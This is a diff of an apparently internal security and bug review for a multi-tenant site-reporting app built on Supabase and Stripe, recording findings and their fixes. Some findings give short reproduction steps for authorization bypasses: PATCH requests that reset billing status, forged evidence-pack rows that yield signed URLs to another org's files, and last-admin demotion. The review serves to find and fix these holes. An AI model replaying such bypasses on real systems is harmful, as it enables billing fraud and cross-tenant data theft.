@@ -15,6 +15,39 @@ Fix the critical and high items before real customer data (other organisations, 
 - **Problem:** The "office writes pdfs" / "office updates pdfs" storage policies let any admin, pm or ops member upload to any path under their org's folder in the `pdfs` bucket, including PDFs the worker rendered for WhatsApp reports. `attach_version_pdf()` only records the expected path; it does not stop the file at that path from being replaced.
 - **Fix:** Restrict the policies to paths of versions without a worker-rendered PDF (e.g. a `report_versions.pdf_renderer` column checked by the policy), or upload through an edge function that renders server-side.
 
+### A job that times out is re-queued while its handler is still running
+
+`apps/worker/src/runner.ts` · correctness / duplicate side effects · Known (W1-05 step 9 review) · Closed in W1-10
+
+- **Problem:** `withTimeout` only races the handler; no `AbortSignal` reaches it. When `JOB_TIMEOUT_MS` passes, the runner calls `fail_job`, which re-queues the job with a 30 s backoff and clears its lock, so `claim_jobs` hands it to another slot while the first handler may still be running (a hung Claude, Deepgram, provider or HTTP call). Both runs then write and send, and the lock key no longer serialises the report or conversation. Keeping `JOB_TIMEOUT_MS` a minute below the 10-minute stale lock (`STALE_LOCK_MS`) only makes the reclaim cover a worker that died mid-job; it does not cover a job that times out.
+- **Fix:** Add an `AbortSignal` to `Ctx` and pass it to the provider and HTTP calls, so a timeout stops the work. Call `failJob` only after the handler promise settles, or keep the row `running` and refresh `locked_at` as a heartbeat until it does (tracked in `docs/PLAN_WEEK1.md`, W1-10).
+- **Closed in W1-10 (both halves):** every job gets its own AbortSignal (`Ctx.signal`), and the handler runs inside `runWithSignal` (`apps/worker/src/abort.ts`), so the clients built at boot abort the job's HTTP calls through `abortableFetch`: Claude and OpenAI (their SDKs' `fetch`, and Claude's per-request `signal`), Supabase Storage (`global.fetch`), the SMS drivers, WhatsApp and the weather fetch; Resend takes neither, so its send is raced against the signal. On timeout the runner aborts the signal and calls `fail_job` only after the handler settles (a handler that finished its work after all is completed); meanwhile the row stays `running` and `heartbeatJob()` refreshes `locked_at` every minute (only while `locked_by` is this worker), so `claim_jobs()` never reclaims it, and a handler that ignores the abort for 30 s goes to Sentry and keeps its slot. The wait is bounded: 5 minutes after the abort (`STUCK_JOB_MS`) the job is stuck, its heartbeat stops, `/health` answers 503 and the worker exits, so the platform restarts it and `claim_jobs()` re-runs the job after the stale lock, with the stuck handler gone with the process. Tests: `apps/worker/src/runtime.test.ts` (aborted, not claimable while it settles, failed with the backoff after; an ignoring handler heartbeats and completes), `db.pglite.test.ts` (the heartbeat keeps a 9-minute-old lock from being reclaimed). Left: an SDK without a signal (Resend) may still deliver a request the job stopped waiting for; the CPU-bound PDF render does not check the signal.
+
+### Office users can read reporters' device codes and personal links
+
+`packages/shared/src/notify/notifier.ts` (was `supabase/functions/field-api/console_code.ts`) · authorization / impersonation · Known (W1-07) · Closed: device-code half in W1-07, link-code half in W1-08
+
+- **Problem:** Every SMS is logged in full in `messages.body`, which admin, pm and ops of the org read (`messages_select`, the Demo phone, realtime). The `welcome` text carries the reporter's personal link code and the `verify_code` text the device code. An office user who reads both can open the link on their own phone, verify it as the reporter, and then give consent, upload and confirm reports in the reporter's name: field-api audits it all as `actor_type 'reporter'`.
+- **Closed in W1-07 (device code):** the W1-07 console sender writes `verify_code` only for `is_demo` orgs (the Demo phone needs the text); a real org gets `no_channel` (409 `code_undeliverable`) and no `messages` row (then `console_code_test.ts`, since W1-08 `code_sender_test.ts`; `app_test.ts`, the stack test). A masked code would be useless to the reporter, so a console `verify_code` has no use on a real org: W1-08's Notifier keeps that rule (`console` sends `verify_code` only on demo orgs; a real org without a sender id gets no code).
+- **Closed in W1-08 (link code):** the Notifier stores a text in full only when it went to `console` for an `is_demo` org (the Demo phone needs it); otherwise every link code (`/r/••••••`, `maskFieldLinkUrl`) and the device code (`MASKED_CODE`) are masked in `messages.body` (`maskedVars`; `notifier.test.ts`, the worker's `send_welcome` test on a real org). `verify_code` on `console` for a real org is still not sent (`no_channel`, spec §19 Q48). The personal link's code is derived from `LINK_SIGNING_SECRET` (spec §4.5), so nothing outside the HMAC key can rebuild it, and `field_links` keeps only its hash. What remains: a demo org's office sees its demo reporters' codes by design, and the device and consent audit rows (user agent, IP) help spot misuse.
+
+### The photos bucket takes any media type until step 22
+
+`supabase/migrations/20261014000006_field_api.sql` (section 7) · storage hardening · Known (W1-07) · Close in step 22
+
+- **Problem:** A signed upload URL fixes neither the type nor the size. W1-07 limits the `audio` bucket to `audio/*` and both upload buckets to 50 MB, and `field-api` checks every object before its upload completes and removes one that fails; but the `photos` bucket still stores any type, because the WhatsApp intake puts documents there (`apps/worker/src/router/media.ts`). An object uploaded through a field signed URL and never completed stays in the bucket with the type its uploader chose; no panel view lists it.
+- **Fix:** With step 22 (WhatsApp removed), a forward migration sets `allowed_mime_types` on `photos` to `image/*` (the `UPLOAD_MEDIA_TYPES` photo types and the office photo types), and the retention job also removes the objects of field `uploads` rows that never completed, as `list_orphan_office_photos()` already does for office photos after a day.
+
+### The panel's buttons and inputs are 41.25 px tall, under the 44 px target
+
+`apps/web/src/components/ui/Button.tsx`, `apps/web/src/components/ui/Input.tsx` · accessibility (targets ≥ 44 px, CLAUDE.md) · Known (W1-08 review) · **Closed (2026-10-15)**
+
+- **Problem:** The panel's root font size is 15 px, so Tailwind's `h-11` / `min-h-11` (2.75 rem) is 41.25 px, not 44 px. The shared `Button` (default size) and `Input` / `Textarea` use `h-11`, so most of the panel's buttons and text fields are 2.75 px under the 44 px target at every width. Measured in Playwright on the demo build at 390 px: the Demo phone's reply box was 41.25 px tall before it was given a pixel minimum.
+- **Fixed so far:** the Demo phone (W1-08): its tabs, Back, Send and the reply box set `min-h-[44px]`, and `e2e/a11y.spec.ts` ("the Demo phone keeps 44 px targets at 390px") measures each.
+- **Fix:** Size the shared `Button` and `Input` in pixels (`min-h-[44px]`, and the dense variants on purpose), or move the 44 px to a token (`--size-target: 44px`) that the components read, and extend the 390 px checks in `e2e/a11y.spec.ts` to the main pages' controls.
+- **Closed:** Two pixel tokens in `packages/shared/src/tokens.css` `@theme` (mirrored in `tokens.ts` `targets`): `--spacing-target: 44px` and `--spacing-target-dense: 40px` (§14.3: 44 px, 40 px in dense tables), so Tailwind makes `h-target`, `min-h-target`, `size-target`, `h-target-dense` … that no root font size can shrink. They replace `h-11` / `min-h-11` / `size-11` (41.25 px) in the shared `Button` (default, `icon`), `Input` / `Textarea`, `SelectTrigger`, `SelectItem` and `DropdownMenuItem`s (were 37.5 px), `TabsList`, the shell (top-bar search, sidebar links, language switch), `MediaPlayer`, the settings rows, toggle chips and section tab bar, and the signed-off state beside the report's buttons; the Demo phone drops its own `min-h-[44px]`s for the token. Every `h-10` / `min-h-10` meant as the 40 px dense size (37.5 px on the 15 px root) is now `h-target-dense`: `Button` `dense` / `iconDense`, `SelectTrigger dense`, the report editor's table inputs, the reports filters, the invite / edit reporter site chips and checkbox rows, the glossary and recipients inputs. `e2e/a11y.spec.ts` ("shared buttons and inputs are 44 px targets at 390px / 1440px") measures sign-in (email, submit, SSO), Sites (Add site, search), Team (Invite reporter) and the Invite reporter dialog (name, phone, country, send). Heights only: the visual-review screenshots were regenerated, and a run with the tokens set back to `2.75rem` / `2.5rem` reproduces the old images (the ones not already stale), so the diffs are the target sizes alone (square icon buttons grow in width with their height).
+- **Deliberately compact, unchanged:** `Button size="sm"` (inline text actions beside content: report version bar, top bar, setup and recipients rows; mostly `variant="link"`), the `TabsTrigger`s and settings section tabs inside their 44 px bar (a segmented control; the Demo phone's tabs grow to 44 px), the top-bar search's clear button inside the 44 px field, the report version select and the weather month select (`h-9`, inside a toolbar), and the recipient / setup chips with a remove button. All are ≥ 24 px (WCAG 2.2 AA 2.5.8). Seen while testing, not fixed here: `/team` at 390 px scrolls sideways (the Field reporters card grows to ~588 px with its table; it was 586 px wide in the old screenshot too).
+
 ## Critical (1)
 
 ### Inviting a phone already used by another org's reporter gives the inviting org that reporter's conversation and full message history
@@ -28,14 +61,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Messages, transcripts and conversation context of a phone shared by two orgs leak to the org that attached the conversation first
 
-`supabase/migrations/20261011000004_rls.sql:133` · cross-org-data-leak · Confirmed 6/6
+`supabase/migrations/20261011000004_rls.sql:133` · cross-org-data-leak · Confirmed 6/6 · **Partly fixed (W1-05 step 9):** a message tagged with an org (`messages.org_id`) is that org's in `messages_select` and `message_org()`, so its transcript and its realtime events follow, and `conversations.context` is no longer readable by API roles (`20261014000001_queue_rls_fixes.sql`; role-matrix probes "messages/transcripts: org A … does not read org B's voice note", "conversations: pm reads the context …"). Still open: the worker does not set `messages.org_id` on WhatsApp messages (steps 1–3 of the fix below), so in a live shared conversation B's untagged WhatsApp messages stay A's until WhatsApp retires (step 22); SMS rows and office uploads always carry it.
 
 - **Problem:** Reporter Pat (+15550001111) belongs to org A, which owns the conversation, and is later invited by org B. Pat files a voice report for B's site. A pm in org A runs the panel's global search (SupabaseSource: transcripts textSearch with no org filter, relying on RLS) and sees snippets of B's transcript. A direct `GET /transcripts` or `GET /messages` returns everything. `GET /conversations` exposes context.active_report_id and candidate_site_ids, which are B's report and site ids. Meanwhile B's admin opens the report and sees no voice note and no transcript. I reproduced this on PGlite: A's admi…
 - **Fix:** The suggested fix keys only on report_sources. Many messages for B's report never appear there, so A would still see them: - outbound draft, summary and question messages - answers and button replies - edit replies (report_versions.author_message_id) - site-picker and pending messages B also still could not see its own conversation thread for the day, which the panel loads at SupabaseSource.ts:676-684. Corrected fix: tag each message with the org it belongs to. 1. Add `messages.org_id uuid references orgs`. - The worker sets it once routing resolves a site or report. That covers inbound messages attached to a report, and outbound messages sent for a report or site (draft, questions, PDF, we…
 
 ### Org admins can overwrite the Stripe-mirrored billing columns and the grace period, bypassing the billing block and hijacking another customer's Stripe ids
 
-`supabase/migrations/20261011000004_rls.sql:72` · authorization · Confirmed 6/6
+`supabase/migrations/20261011000004_rls.sql:72` · authorization · Confirmed 6/6 · **Fixed (W1-05 step 9):** the `orgs` half by `20261013000007_schema_expand_v1_2.sql` (UPDATE only on the profile columns, direct edits audited as `org.updated`; role-matrix probes "orgs: an admin writes …"), the `org_settings` half, fix (2) below, by `20261014000001_queue_rls_fixes.sql` (INSERT and UPDATE revoked, UPDATE re-granted on the settings columns the panel saves with `updated_at`, never `org_id` or `past_due_grace_days`; probes "org_settings: …").
 
 - **Problem:** An admin whose org is canceled or past due runs `PATCH /orgs?id=eq.<org> {billing_status:'active'}`, or sets org_settings.past_due_grace_days to 100000. scheduler-tick then keeps creating site-days and sending reminders with no payment. I reproduced both on PGlite. Second scenario: a former member of a victim org has seen its cus_/sub_ ids through orgs_select. They create their own org, set stripe_customer_id and stripe_subscription_id to the victim's, and then call api-billing. `portal` opens the victim's Stripe billing portal, where they can cancel the subscription or change the payment met…
 - **Fix:** The column-grant approach is right. Four additions: (1) Put the grants in a new migration: `revoke update on orgs from authenticated, anon; grant update (name, address, license_no, timezone) on orgs to authenticated;` Billing columns and logo_path then stay with the service role and the security definer set_org_logo. (2) For org_settings, revoke update and insert from authenticated and anon. Re-grant update on every settings column the panel saves, explicitly including updated_at, because SupabaseSource.saveSettings (line 1229) sends updated_at. Exclude org_id and past_due_grace_days. Exclude past_due_grace_days only if it is not meant to be admin-configurable under §F19.5; if it is, clamp …
@@ -112,17 +145,19 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Stripe 14-day trial is never applied at checkout and never enforced when it lapses
 
-`supabase/functions/_shared/billing.ts:38` · billing / F19, §19 #4 · Confirmed 3/3
+`supabase/functions/_shared/billing.ts:38` · billing / F19, §19 #4 · Confirmed 3/3 · Closed in W4-10
 
 - **Problem:** An admin creates an org on Oct 1. The Billing page says 'Trial ends Oct 15'. They click 'Add payment details' on Oct 3, Stripe Checkout runs with no trial, and the card is charged $399 x sites right away, even though the UI promised a 14-day free trial. Another org never adds a card: on day 15 and every day after, scheduler-tick still creates site-days, sends reminders and weather jobs, and the panel works, so the rule 'card required before day 15' is never applied.
 - **Fix:** The direction is right, but the checkout half is incomplete. Stripe Checkout rejects subscription_data.trial_end unless it is at least 48 hours in the future. Passing trial_ends_at whenever it is 'still in the future' would therefore make checkout fail with a Stripe error for an admin who adds a card on day 13 or 14. Replace trialDaysFor with a helper that takes now: trialFor(org, now). - If trial_ends_at is null, return { trial_period_days: 14 }. - If trial_ends_at - now >= 48h, return { trial_end: floor(Date.parse(trial_ends_at)/1000) }. - If 0 < remaining < 48h, return { trial_period_days: max(1, ceil(remaining/86400000)) }, or charge now. Pick one and test it. - If remaining <= 0, retur…
+- **Closed in W4-10:** the checkout half was `checkoutTrial()` (the rest of the trial, at least 48 h + 1 h). The lapse half: per spec §19 Q235 an org `trialing` past `trial_ends_at` with no subscription counts as past due from that instant (`effectiveBilling()` / `isOrgBillingBlocked()` in `packages/shared/src/billing.ts`), so the admin banner shows on every page and, after the org's grace days, scheduler-tick and Talk now stop (never a demo or a `manual` org). Tests: `packages/shared/src/billing.test.ts`, `scheduler-tick/logic_test.ts`, `BillingBanner.test.tsx`.
 
 ### Adding a site never increments the Stripe subscription quantity
 
-`apps/web/src/data/supabase/SupabaseSource.ts:1351` · billing / F19 step 1 · Confirmed 3/3
+`apps/web/src/data/supabase/SupabaseSource.ts:1351` · billing / F19 step 1 · Confirmed 3/3 · Closed in W4-10
 
 - **Problem:** An org has an active subscription with quantity 3. The admin adds a 4th site from Sites -> Add site. Reports and reminders run for 4 sites, but Stripe keeps billing 3 x $399 until someone happens to pause or resume a site, so the org is under-billed by $399 per month for as long as that takes.
 - **Fix:** The suggested fix works, with one caveat. If the sync is added after the insert in createSite the way pauseSite and resumeSite do it (`.catch(() => undefined)`), a Stripe or network failure leaves the quantity drifted with no sign of it. A sturdier fix needs two parts. First, do the insert, the audit_log row and syncQuantity on the server, either through an edge-function action or through an RPC followed by a server-side sync. Second, add a self-healing reconciliation, for example in scheduler-tick or when the Billing 'status' action runs, that calls syncDecision for every org with a subscription whose item quantity differs from its active-site count.
+- **Closed in W4-10 (with its caveat):** the panel still calls api-billing `sync` after _Add site_, Pause and Resume, and a failure is reported to Sentry instead of dropped; the database queues a `billing_sync` job two minutes after every site insert or status change of a real Stripe org with a subscription (`sites_billing_sync`, `20261017000450_billing_per_org.sql`), which sets the quantity to the active sites through Stripe's REST API from the worker and is retried by the queue's backoff. Tests: `billing-per-org.test.ts` (the trigger), `apps/worker/src/jobs/billing_sync.test.ts`.
 
 ### Overview fails to load in Supabase mode for an org with no sites, so the 'Connect your first site' empty state never shows
 
@@ -140,10 +175,11 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Site settings drawer (edit site, recipients, Pause site) is open to pm/ops; in Supabase, pause and edit silently do nothing but toast success
 
-`apps/web/src/app/site/Page.tsx:114` · role-gating · Confirmed 3/3
+`apps/web/src/app/site/Page.tsx:114` · role-gating · Confirmed 3/3 · Closed in W4-10
 
 - **Problem:** An ops user opens /sites/<id>, clicks Site settings, then Pause site, then confirms. The toast reads 'Riverside Lofts paused', but the site stays active and keeps getting reminders and billing (Supabase). In demo, the site actually pauses, against the role matrix.
 - **Fix:** The suggested fix is right. Three refinements: 1. Gate in the UI with the existing helper. In site/Page.tsx, render the Site settings button and SiteSettingsDrawer only when `role === 'admin'`. pm/ops can either get a read-only view or no button. 2. Make the Supabase writes fail loudly when nothing changes: - updateSite / pauseSite / resumeSite: use `.update(...).eq('id', siteId).select('id')` and throw when `data.length === 0`. pm/ops can still SELECT sites, so an empty result really means the update was denied. - pauseSite / resumeSite: do this check before the api-billing sync call. - saveSiteRecipients: the same applies to the delete, or move it into an admin-checked RPC. 3. Mirror the …
+- **Closed in W4-10:** Site detail shows _Site settings_ (and its drawer) to admins only; `updateSite`, `pauseSite` and `resumeSite` read the row back (`.select('id')`) and fail with "You're not allowed to do that." when RLS matched none, before any quantity sync; the demo source refuses a pm or ops user the same way. Pause and Resume are admin only everywhere (Billing is an admin route). Tests: `site/Page.test.tsx`, `supabase/pauseSite.test.ts`, `demo/DemoSource.test.ts`, `e2e/billing.spec.ts`.
 
 ### Weather-day follow-up context is never cleared, so later photos and voice notes are filed into an old weather-day report
 
@@ -182,10 +218,11 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Reminder-ladder claim overwrites a site-day that was filed or moved to processing after the tick read it
 
-`supabase/functions/scheduler-tick/index.ts:279` · correctness/race · Unverified
+`supabase/functions/scheduler-tick/index.ts:279` · correctness/race · Unverified · Closed in W2-06
 
 - **Problem:** Default deadline 17:30. At 17:45 a tick reads site-day X as 'pending'. While it works through other due sites, the reporter's voice note is ingested and the worker sets X to 'processing'. The tick's claimStage(X, 2) then sets status='reminded', so the manager gets 'No report yet for {site} today' just after reporting. Because X is back in LADDER_STATUSES, later ticks send R2 at 18:30 and at 19:00 set it to 'missing' and email the office, while the report waits in awaiting_confirmation (the confirm timeout is up to 2 h). Worse, if the report is filed between the read and the stage-4 claim, a f…
 - **Fix:** Guard the claim on status as well: `.in('status', LADDER_STATUSES)` (pending, reminded) in claimStage, so a site-day that left the ladder in the meantime is not touched. Alternatively do the claim in one SQL statement or RPC that checks both reminder_stage and status.
+- **Closed in W2-06:** The ladder is rebuilt on the Notifier and each stage is claimed by `claim_site_day_reminder()` (`20261016000040_reminder_ladder.sql`): one statement locks the site-day `where status in ('pending', 'reminded') and not reminders_paused … for update`, so a filing or an upload that commits first leaves the claim nothing to do (false, no job, no status change), and the stage, its audit and its `notify` jobs commit together. Tests: `supabase/db-tests/src/reminder-ladder.test.ts` ("never claims a day that left pending/reminded"), `supabase/db-tests/stack/reminder-claim.test.ts` (a claim racing a filing on real Postgres, both orders: one wins).
 
 ### Stripe Checkout never grants the 14-day trial: every org already has trial_ends_at from create_org
 
@@ -212,14 +249,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Org admins can rewrite billing state that the edge functions trust (billing_status, Stripe ids, trial, grace period)
 
-`supabase/migrations/20261011000004_rls.sql:72` · authorization / billing bypass · Confirmed 3/3
+`supabase/migrations/20261011000004_rls.sql:72` · authorization / billing bypass · Confirmed 3/3 · **Fixed (W1-05 step 9):** `billing_status`, the Stripe ids and `trial_ends_at` are service-only since `20261013000007_schema_expand_v1_2.sql`, and the grace period (`org_settings.past_due_grace_days`) since `20261014000001_queue_rls_fixes.sql`.
 
 - **Problem:** An org whose subscription was canceled (billing_status='canceled', so scheduler-tick stops site-days and reminders) runs supabase.from('orgs').update({billing_status:'active'}).eq('id', orgId) from the browser. The next tick treats the org as unblocked and service resumes without payment. Alternatively a past_due org sets org_settings.past_due_grace_days = 100000. An admin can also null trial_ends_at and stripe_subscription_id, then call api-billing checkout again: the 409 guard passes and trialDaysFor grants a fresh 14-day trial on every repeat. Setting stripe_customer_id to another customer…
 - **Fix:** The suggested direction is right, with two adjustments. 1. **Use a trigger, not only column grants.** The PGlite harness (supabase/db-tests/src/harness.ts:71) runs `grant all on all tables ... to authenticated` after migrations. That would silently undo a column-level REVOKE in `pnpm test:db`, so no RLS test could catch a regression. Use one or both of these: - (a) In a new migration: `revoke update on orgs from authenticated; grant update (name, address, license_no, timezone) on orgs to authenticated;`, and change the harness so it does not re-grant all after migrations. - (b) Preferred, because it holds whatever the grants are: a BEFORE UPDATE trigger on orgs that raises 42501 when `curre…
 
 ### api-evidence-pack signs a service-role download URL for whatever pdf_path the client inserted
 
-`supabase/functions/api-evidence-pack/index.ts:127` · authorization / storage IDOR · Confirmed 3/3
+`supabase/functions/api-evidence-pack/index.ts:127` · authorization / storage IDOR · Confirmed 3/3 · **Fixed (W1-05 step 9):** no client can insert or change an `evidence_packs` row any more (`20261014000001_queue_rls_fixes.sql`), and the migration marks a pack written before it for another org's site, or with a `pdf_path` outside its org and site, as `failed`, path cleared, with an `evidence_pack.forged_cleared` audit row. `getPack` and the worker's `send_email` sign only a path under `<org_id>/<site_id>/` (`isOwnEvidencePackPath`, `packages/shared/src/report/numbering.ts`; fix (1) by prefix, since `period_start`/`period_end` of an old row need not match its file).
 
 - **Problem:** A pm of org B inserts {org_id: B, created_by: self, period_start, period_end, status: 'ready', pdf_path: '<orgA>/<siteA>/eot_2026-09-01_2026-09-30.pdf'} into evidence_packs, then calls GET api-evidence-pack?id=<that row>. requireOrgRole passes for B, and the function returns a 7-day signed URL to org A's EOT evidence pack. The path format is fixed by evidencePackStoragePath, so the attacker needs org A's org and site ids; exploitability is limited by UUID secrecy, but no authorization check stands in the way.
 - **Fix:** The suggested fix is right; a few refinements. (1) In getPack, before signing, refuse with 500 or 409 unless pack.pdf_path starts with `${pack.org_id}/`. If pack.site_id is non-null, compare the whole path to evidencePackStoragePath(pack.org_id, pack.site_id, pack.period_start, pack.period_end) instead. site_id is nullable in the schema, so recomputing alone does not cover every row. A different option is to sign with a client built on the caller's JWT, so the storage policy "members read org files" applies. (2) Close the insert hole at the source. Either drop evidence_packs_insert, since creation already goes through createPack with the service role, or add `and status = 'queued' and pdf_p…
@@ -233,35 +270,35 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### evidence_packs insert policy lets a user forge a 'ready' pack with any pdf_path, which api-evidence-pack signs with the service role
 
-`supabase/migrations/20261011000004_rls.sql:161` · confused-deputy · Confirmed 6/6
+`supabase/migrations/20261011000004_rls.sql:161` · confused-deputy · Confirmed 6/6 · **Fixed (W1-05 step 9):** `evidence_packs_insert` dropped and INSERT, UPDATE, DELETE revoked from API roles (`20261014000001_queue_rls_fixes.sql`); packs are created by `api-evidence-pack` with the service role. Rows forged before the migration are neutralised by it (marked `failed`, path cleared, audited), and `getPack` and `send_email` sign only a path under the pack's org and site (see "api-evidence-pack signs a service-role download URL …").
 
 - **Problem:** An ops user in org A inserts `{org_id:A, site_id:<B site>, period_start:'2026-09-01', period_end:'2026-09-30', status:'ready', pdf_path:'<orgB>/<siteB>/eot_2026-09-01_2026-09-30.pdf', created_by:<self>}`. PGlite accepts the row. They then call `GET api-evidence-pack?id=<row>` and receive a 7-day signed URL to org B's EOT pack. B's site ids leak through conversation context (see the shared-phone finding), and `site_org(<site id>)`, which anon and authenticated can execute, turns a site id into its org id.
 - **Fix:** The suggested fix is correct. Drop evidence_packs_insert, since the edge function already inserts with the service role. If a client insert is ever needed, use `with check (has_role(org_id,'{admin,pm,ops}') and created_by = auth.uid() and status = 'queued' and pdf_path is null and ready_at is null and site_org(site_id) = org_id)`. Also harden GET in api-evidence-pack/index.ts:126 so it signs only when `pack.site_id && pack.pdf_path === evidencePackStoragePath(pack.org_id, pack.site_id, pack.period_start, pack.period_end)`, or at minimum when pdf_path starts with `${pack.org_id}/`. The same check belongs in apps/worker/src/jobs/send_email.ts:145, which also signs pack.pdf_path with the servi…
 
 ### org_members update and delete policies allow an org with zero admins, and role changes leave no audit trail
 
-`supabase/migrations/20261011000004_rls.sql:106` · authorization · Confirmed 6/6
+`supabase/migrations/20261011000004_rls.sql:106` · authorization · Confirmed 6/6 · **Fixed (W1-05 step 9):** an after-row guard on `org_members` refuses demoting or removing an org's last admin (P0001) for every writer, locks the org row so two concurrent demotions cannot both pass (`supabase/db-tests/stack/last-admin.test.ts`) and lets the cascades from deleting the org or the user through; the panel's role changes, removals and additions are audited as `member.role_changed`, `member.removed`, `member.added`. API roles update only `role`, `display_name`, `title` and `ui_locale`, never the key (`org_id`, `user_id`), so an admin can neither hand a seat to another account nor move a member between orgs; a key change by a writer that keeps the privilege is logged as `member.removed` plus `member.added` (`20261014000001_queue_rls_fixes.sql`).
 
 - **Problem:** Org A has a single admin, who runs `PATCH /org_members?org_id=eq.A&user_id=eq.<self> {role:'ops'}`. PGlite accepts it and leaves 0 admins. Nobody can then change settings, invite users, manage billing or restore an admin without the service role. Two admins demoting or removing each other at the same time in the UI reach the same state, because each client counts 2 admins. Any admin can also promote someone else to admin with no audit_log row.
 - **Fix:** The suggested direction is right, but a bare BEFORE UPDATE OR DELETE trigger is incomplete as written. org_members rows are deleted by ON DELETE CASCADE from orgs and auth.users (supabase/migrations/20261011000002_tables.sql:20-21), and apps/worker/src/integration/loadtest.ts:889 deletes orgs. An unconditional "no last admin" trigger would therefore block deleting an org or an auth user. The guard must let a removal through when the parent org or user is itself being deleted. For example, skip when pg_trigger_depth() > 1, or when the org row no longer exists or is locked for delete. It should also lock the org's admin rows with `select ... for update` before counting. Simpler and preferred …
 
 ### notifications and audit_log ignore the spec's role restrictions, so the accounts role sees unknown-sender snippets, missing-report and billing alerts, and the full audit trail
 
-`supabase/migrations/20261011000004_rls.sql:169` · authorization · Confirmed 3/3
+`supabase/migrations/20261011000004_rls.sql:169` · authorization · Confirmed 3/3 · **Fixed (W1-05 step 9):** `notifications_select` shows an org-wide row only to the roles of its kind (`notification_audience()`: the §13 recipients plus admin; a kind it does not know goes to admin, pm, ops), and `audit_log_select` is admin, pm, ops (`20261014000001_queue_rls_fixes.sql`).
 
 - **Problem:** An unknown number sends a voice note. The worker calls notify_org(org, 'unknown_sender', ..., body = the transcribed snippet). An accounts user can read that snippet in the bell or through realtime, together with the missing-report, needs-review, billing and report_edited notices. I reproduced this on PGlite. The same user can also read audit_log, including reporter.updated names, settings diffs and report change notes.
 - **Fix:** Notifications: - Store an audience on each row, or derive it from kind in one SQL helper `notification_audience(kind) returns member_role[]` so callers do not change. - Mapping per §13: - unknown_sender and missing_report: {admin,ops} - needs_review: {admin,pm,ops}, where §13 says ops and pm - billing: {admin} - invoice_gap: {ops,accounts} - glossary_review and processing_delayed: {admin,pm,ops} - pack_ready and report_edited: user-specific (user_id set) - Policy: `is_member(org_id) and (user_id = auth.uid() or (user_id is null and has_role(org_id, notification_audience(kind))))`. - Apply the same predicate in mark_notifications_read (rpcs.sql:294-298). As written it still lets an accounts …
 
 ### mark_notifications_read sets one shared read_at on org-wide notifications, so any member, including accounts, hides alerts from everyone
 
-`supabase/migrations/20261011000005_rpcs.sql:294` · correctness · Confirmed 2/3
+`supabase/migrations/20261011000005_rpcs.sql:294` · correctness · Confirmed 2/3 · **Partly fixed (W1-05 step 9):** `mark_notifications_read` marks only rows the caller can see, so accounts can no longer hide an ops or admin alert (`20261014000001_queue_rls_fixes.sql`). Still open: one shared `read_at` per org-wide row among its audience (per-user read state).
 
 - **Problem:** At 18:05 the worker writes 'Riverside Lofts: no report' (missing_report, user_id null). An accounts user opens the bell and clicks Mark all read, which runs mark_notifications_read(all ids). The ops manager's bell now shows no unread dot and the badge count drops, so the missing-report alert is never noticed. I reproduced this on PGlite: read_at was set for the shared row after the accounts user's call.
 - **Fix:** The suggested per-user read table fixes the shared read state but is incomplete. Org-wide rows also ignore the §13 recipient roles, so accounts and pm users still see and act on ops/admin-only alerts like missing_report and unknown_sender, and invoice_gap is not limited to ops and accounts. Simplest complete fix: make notify_org (rpcs.sql:21) fan out when p_user_id is null. Insert one row per org_members row whose role matches the kind's §13 recipients, for example missing_report and unknown_sender go to {admin,ops}, needs_review to {ops,pm}, invoice_gap to {ops,accounts}. Then each user has their own read_at, and the existing select policy and mark_notifications_read work unchanged for use…
 
 ### site_reporters write policy does not check the reporter's org, so a reporter from another org can be linked to your site
 
-`supabase/migrations/20261011000004_rls.sql:123` · cross-org-integrity · Confirmed 2/3
+`supabase/migrations/20261011000004_rls.sql:123` · cross-org-integrity · Confirmed 2/3 · **Fixed (W1-05 step 9):** the policy requires `reporter_org(reporter_id) = site_org(site_id)`, and an after-row trigger refuses a cross-org link from every writer, the service role included. Neither end changes org afterwards: API roles update only the site columns the panel saves (not `org_id`, `report_seq`, `active_since`), and a trigger refuses moving a site or a reporter to another org from every writer (moving a site, as an admin of both orgs could, carried its links, site days and uploads with it). A cross-org link written before the migration is removed by it with a `site_reporter.removed_cross_org` audit row (`20261014000001_queue_rls_fixes.sql`).
 
 - **Problem:** Org A's ops learns org B's reporter id, for example from a shared-phone conversation's context. They insert `(site_id = A's site, reporter_id = B's reporter, is_primary = true)`, which PGlite accepts. scheduler-tick's pickReminderTarget for A's site now picks B's verified reporter and sends A's reminder templates to B's site manager. That manager's replies can be routed to A's site, filing B-side content into org A.
 - **Fix:** The suggested fix is correct: add `and reporter_org(reporter_id) = site_org(site_id)` to WITH CHECK (and to USING for symmetry) in site_reporters_write. reporter_org is security definer, so it can see the other org's row and will reject the mismatch. A BEFORE INSERT OR UPDATE trigger (or constraint trigger) on site_reporters that raises when (select org_id from reporters where id = new.reporter_id) is distinct from (select org_id from sites where id = new.site_id) is the stronger option, because it also covers service-role writers (edge functions, the worker, RPCs), which bypass RLS. Add a db-test with an insert from org A's ops that uses B's reporter id, as in the PGlite reproduction above.
@@ -275,7 +312,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Transcripts, text replies, captions and unknown-sender snippets reach Claude verbatim, including any phone numbers in them
 
-`apps/worker/src/ai/prompts/extraction.ts:146` · security/pii · Confirmed 2/3
+`apps/worker/src/ai/prompts/extraction.ts:146` · security/pii · Confirmed 2/3 · **Fixed (W1-12):** `redactPhones()` in `packages/shared/src/redact.ts` (Deno-safe; the `ops_redact()` patterns of `20261012000003_ops.sql` plus the Turkish 0532 123 45 67 grouping; replaces in the original string and leaves UUIDs, ISO dates and times alone) is applied centrally in `buildParams` (`apps/worker/src/ai/claude.ts`) to every system block and every text of every user turn, the corrective retry turns `callTool` appends included, so extraction (v1 and v2), answers, classification, corrections and the site guess are covered. Tests: `redact.test.ts`, `eval.test.ts` (a number said in the note reaches the model as `[phone]`).
 
 - **Problem:** A site manager texts the report: "Pump truck driver Mike 555-014-3378 arrived 9:10, Apex 6 guys full day". composeExtractionInput includes the body as a TEXT MESSAGE, and the number is sent to Anthropic in the extraction prompt. The same thing happens when an unknown number writes "call me on +1 555 014 3378, I'm at Riverside": the text goes to the site-guess call.
